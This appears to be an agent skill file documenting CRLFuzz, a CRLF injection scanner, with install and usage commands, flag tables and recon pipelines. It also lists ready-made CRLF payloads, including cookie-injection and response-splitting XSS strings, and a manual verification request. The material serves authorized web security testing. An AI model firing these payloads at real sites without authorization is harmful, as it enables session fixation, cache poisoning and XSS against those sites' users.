---
name: crlfuzz
description: "CRLFuzz: fast Go-based CRLF injection scanner testing HTTP response splitting via injected carriage return / line feed sequences. Use when checking web apps for CRLF injection to detect header injection, cookie injection, or HTTP response splitting that enables XSS, cache poisoning, or session fixation."
license: MIT
compatibility: "Linux / macOS / Windows. go install github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest or apt install crlfuzz (Kali). Docker: dw1/crlfuzz."
metadata:
  author: AeonDave
  version: "1.0"
---

# CRLFuzz

Fast CRLF injection scanner — header injection, response splitting, cookie injection.

## Quick Start

```bash
# Install (Kali)
sudo apt install crlfuzz

# Install via Go
go install github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest

# Single URL
crlfuzz -u "https://target.com/page?next=FUZZ"

# From URL list
crlfuzz -l urls.txt

# Pipe from other tools
cat urls.txt | crlfuzz

# With proxy (e.g., Burp)
crlfuzz -u "https://target.com/" -x http://127.0.0.1:8080
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-u, --url <url>` | Target URL (place `FUZZ` at injection point) |
| `-l, --list <file>` | File with URLs to test |
| `-X, --method <verb>` | HTTP method (default: GET) |
| `-d, --data <data>` | POST body data |
| `-H, --header <header>` | Custom HTTP header (repeatable) |
| `-x, --proxy <url>` | HTTP/SOCKS5 proxy |
| `-o, --output <file>` | Save results to file |
| `-c, --concurrent <n>` | Concurrency level (default: 20) |
| `-s, --silent` | Silent mode (suppress banner) |
| `-v, --verbose` | Verbose output |

## CRLF Injection Basics

CRLF = `\r\n` (ASCII 13 + 10). Injected into HTTP headers, it splits the response:

```
# Normal URL
https://target.com/redirect?url=/home

# Injected CRLF → splits response and injects headers
https://target.com/redirect?url=%0D%0ASet-Cookie:%20malicious=injected

# Response with injected header:
HTTP/1.1 302 Found
Location: /home
Set-Cookie: malicious=injected    ← injected line
```

## Common CRLF Payloads

```
# URL-encoded CRLF
%0d%0a
%0D%0A

# Double-encoded
%250d%250a
%25%30%64%25%30%61

# Unicode
%E5%98%8A%E5%98%8D   (UTF-8 CRLF-like)

# Null + CRLF
%00%0d%0a

# Header injection payload
%0d%0aSet-Cookie:%20crlftest=injected;path=/
%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
```

## Impact Scenarios

| Injection Point | Impact |
|-----------------|--------|
| `Location:` redirect value | Header injection, open redirect |
| Cookie `Set-Cookie:` header | Session fixation, cookie poisoning |
| `Content-Type:` value | XSS via response splitting |
| Cache headers | Cache poisoning |
| `X-XSS-Protection:` | XSS filter bypass |

## Pipeline Integration

```bash
# Find CRLF-injectable URLs from recon results
cat live-hosts.txt | httpx -silent -path "/?next=FUZZ" | crlfuzz -s

# Combine with ffuf first for URL discovery
ffuf -w paths.txt -u https://target.com/FUZZ -o urls.json
cat urls.json | jq -r '.results[].url' | crlfuzz -l /dev/stdin
```

## Manual Verification

After CRLFuzz reports a finding, confirm in Burp Repeater:

```
GET /redirect?url=%0d%0aSet-Cookie:%20test=crlfinjected HTTP/1.1
Host: target.com
```

Look for `Set-Cookie: test=crlfinjected` in the response headers.

## References

- [CRLFuzz GitHub](https://github.com/dwisiswant0/crlfuzz)
- [HackTricks CRLF Injection](https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a)
